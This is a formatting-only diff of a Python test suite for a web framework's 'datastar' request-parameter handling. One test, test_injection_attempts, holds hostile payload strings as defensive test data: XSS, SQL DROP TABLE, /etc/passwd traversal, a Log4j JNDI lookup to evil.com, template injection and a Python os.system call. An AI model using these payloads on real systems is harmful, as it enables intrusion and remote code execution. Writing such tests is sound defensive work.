@@ -253,11 +253,11 @@ def test_security_large_payload():
         return f"Param: {param}"
 
     client = TestClient(app)
-    
+
     # Create a large payload (but not too large for test)
     large_value = "x" * 10000
     datastar_data = {"param": large_value}
-    
+
     response = client.get(f"/test?datastar={json.dumps(datastar_data)}")
     assert response.status_code == 200
     # Should handle large values gracefully
@@ -273,13 +273,13 @@ def test_unicode_edge_cases():
         return {"name": name, "emoji": emoji}
 
     client = TestClient(app)
-    
+
     # Test with various unicode characters
     datastar_data = {
         "name": "测试用户",  # Chinese characters
-        "emoji": "🚀💯🔥"   # Emojis
+        "emoji": "🚀💯🔥",  # Emojis
     }
-    
+
     response = client.get(f"/test?datastar={json.dumps(datastar_data)}")
     assert response.status_code == 200
     result = response.json()
@@ -296,16 +296,16 @@ def test_none_vs_missing():
         return {"value": optional, "is_none": optional is None}
 
     client = TestClient(app)
-    
+
     # Test explicit None
-    response = client.get(f'/test?datastar={json.dumps({"optional": None})}')
+    response = client.get(f"/test?datastar={json.dumps({'optional': None})}")
     assert response.status_code == 200
     result = response.json()
     assert result["value"] is None
     assert result["is_none"] is True
-    
-    # Test missing parameter  
-    response = client.get('/test?datastar={}')
+
+    # Test missing parameter
+    response = client.get("/test?datastar={}")
     assert response.status_code == 200
     result = response.json()
     assert result["value"] == "default"
@@ -321,16 +321,16 @@ def test_deeply_nested_json():
         return f"Param: {param}"
 
     client = TestClient(app)
-    
+
     # Create a deeply nested structure
     deeply_nested = {"level1": {"level2": {"level3": {"level4": {"level5": {"param": "deep_value"}}}}}}
-    
+
     # Should handle deeply nested structures gracefully
     response = client.get(f"/test?datastar={json.dumps(deeply_nested)}")
     assert response.status_code == 200
     # Since param is at top level of datastar, it won't be found
     assert response.text == "Param: default"
-    
+
     # Test with param at top level
     data_with_param = {"param": "found", "nested": deeply_nested}
     response = client.get(f"/test?datastar={json.dumps(data_with_param)}")
@@ -348,17 +348,17 @@ def test_injection_attempts():
         return {"param": param, "length": len(param)}
 
     client = TestClient(app)
-    
+
     # Test various injection attempts
     injection_tests = [
         {"param": "<script>alert('xss')</script>"},  # XSS attempt
-        {"param": "'; DROP TABLE users; --"},  # SQL injection attempt  
+        {"param": "'; DROP TABLE users; --"},  # SQL injection attempt
         {"param": "../../etc/passwd"},  # Path traversal
         {"param": "${jndi:ldap://evil.com/a}"},  # Log4j style
         {"param": "{{7*7}}"},  # Template injection
         {"param": "__import__('os').system('ls')"},  # Python code injection
     ]
-    
+
     for test_data in injection_tests:
         response = client.get(f"/test?datastar={json.dumps(test_data)}")
         assert response.status_code == 200
@@ -372,36 +372,32 @@ def test_recursive_references():
     """Test handling of recursive/circular references in JSON"""
     app, rt = star_app()
 
-    @rt("/test") 
+    @rt("/test")
     def test_route(param: str = "default"):
         return {"param": param, "length": len(param)}
 
     client = TestClient(app)
-    
+
     # Test various edge cases in GET requests (limited by URL length)
     get_test_cases = [
         '{"param": "value", "ref": {"$ref": "#"}}',  # JSON pointer attempt
         '{"param": "\\u0000"}',  # Null byte
-        '{"param": "' + 'x' * 1000 + '"}',  # Long string (but not too long for URL)
+        '{"param": "' + "x" * 1000 + '"}',  # Long string (but not too long for URL)
     ]
-    
+
     for json_str in get_test_cases:
         response = client.get(f"/test?datastar={json_str}")
         assert response.status_code == 200
         # Should either parse successfully or fall back to default
-        
+
     # Test very large payloads with POST
     @rt("/test-post", methods=["POST"])
     def test_post_route(param: str = "default"):
         return {"param": param[:50] + "..." if len(param) > 50 else param, "length": len(param)}
-    
+
     # Test large POST payload
     large_value = "x" * 100000
-    response = client.post(
-        "/test-post",
-        json={"$param": large_value},
-        headers={"Content-Type": "application/json"}
-    )
+    response = client.post("/test-post", json={"$param": large_value}, headers={"Content-Type": "application/json"})
     assert response.status_code == 200
     result = response.json()
     assert result["length"] == 100000
@@ -410,20 +406,20 @@ def test_recursive_references():
 
 def test_concurrent_requests():
     """Test datastar unpacking under concurrent load"""
-    import asyncio
     from concurrent.futures import ThreadPoolExecutor
-    
+
     app, rt = star_app()
 
     @rt("/concurrent")
     def concurrent_route(user_id: int, action: str):
         # Add small delay to increase chance of race conditions
         import time
+
         time.sleep(0.001)
         return {"user_id": user_id, "action": action}
 
     client = TestClient(app)
-    
+
     def make_request(i):
         datastar_data = {"user_id": i, "action": f"action_{i}"}
         response = client.get(f"/concurrent?datastar={json.dumps(datastar_data)}")
@@ -432,12 +428,12 @@ def test_concurrent_requests():
         assert result["user_id"] == i
         assert result["action"] == f"action_{i}"
         return result
-    
+
     # Make concurrent requests
     with ThreadPoolExecutor(max_workers=10) as executor:
         futures = [executor.submit(make_request, i) for i in range(50)]
         results = [f.result() for f in futures]
-    
+
     # Verify all requests were processed correctly
     assert len(results) == 50
     for i, result in enumerate(results):
@@ -447,18 +443,11 @@ def test_concurrent_requests():
 
 def test_type_conversions():
     """Test type conversions for datastar parameters"""
-    from typing import Optional
-    
+
     app, rt = star_app()
 
     @rt("/types")
-    def type_route(
-        str_val: str,
-        int_val: int,
-        float_val: float,
-        bool_val: bool,
-        optional_val: Optional[str] = None
-    ):
+    def type_route(str_val: str, int_val: int, float_val: float, bool_val: bool, optional_val: str | None = None):
         return {
             "values": {
                 "str_val": str_val,
@@ -472,69 +461,63 @@ def test_type_conversions():
                 "int": type(int_val).__name__,
                 "float": type(float_val).__name__,
                 "bool": type(bool_val).__name__,
-                "optional": type(optional_val).__name__ if optional_val is not None else "None"
-            }
+                "optional": type(optional_val).__name__ if optional_val is not None else "None",
+            },
         }
 
     client = TestClient(app)
-    
+
     # Test GET request with string values that need conversion
-    response = client.get(f'/types?datastar={json.dumps({
-        "str_val": "hello",
-        "int_val": "42",
-        "float_val": "3.14",
-        "bool_val": "true",
-        "optional_val": "present"
-    })}')
+    response = client.get(
+        f"/types?datastar={
+            json.dumps(
+                {
+                    'str_val': 'hello',
+                    'int_val': '42',
+                    'float_val': '3.14',
+                    'bool_val': 'true',
+                    'optional_val': 'present',
+                }
+            )
+        }"
+    )
     assert response.status_code == 200
     result = response.json()
-    
+
     # Check conversions worked
     assert result["values"]["str_val"] == "hello"
     assert result["values"]["int_val"] == 42
     assert result["values"]["float_val"] == 3.14
     assert result["values"]["bool_val"] is True
     assert result["values"]["optional_val"] == "present"
-    
+
     # Check types
     assert result["types"]["str"] == "str"
     assert result["types"]["int"] == "int"
     assert result["types"]["float"] == "float"
     assert result["types"]["bool"] == "bool"
     assert result["types"]["optional"] == "str"
-    
+
     # Test POST request with native JSON types
     @rt("/types", methods=["POST"])
-    def type_route_post(
-        str_val: str,
-        int_val: int,
-        float_val: float,
-        bool_val: bool,
-        optional_val: Optional[str] = None
-    ):
+    def type_route_post(str_val: str, int_val: int, float_val: float, bool_val: bool, optional_val: str | None = None):
         return type_route(str_val, int_val, float_val, bool_val, optional_val)
-    
+
     response = client.post(
         "/types",
-        json={
-            "$str_val": "world",
-            "$int_val": 99,
-            "$float_val": 2.71,
-            "$bool_val": False,
-            "$optional_val": None
-        },
-        headers={"Content-Type": "application/json"}
+        json={"$str_val": "world", "$int_val": 99, "$float_val": 2.71, "$bool_val": False, "$optional_val": None},
+        headers={"Content-Type": "application/json"},
     )
     assert response.status_code == 200
     result = response.json()
-    
+
     # Check values
     assert result["values"]["str_val"] == "world"
     assert result["values"]["int_val"] == 99
     assert result["values"]["float_val"] == 2.71
     assert result["values"]["bool_val"] is False
     assert result["values"]["optional_val"] is None
-    
+
     # Check None type
     assert result["types"]["optional"] == "None"
 
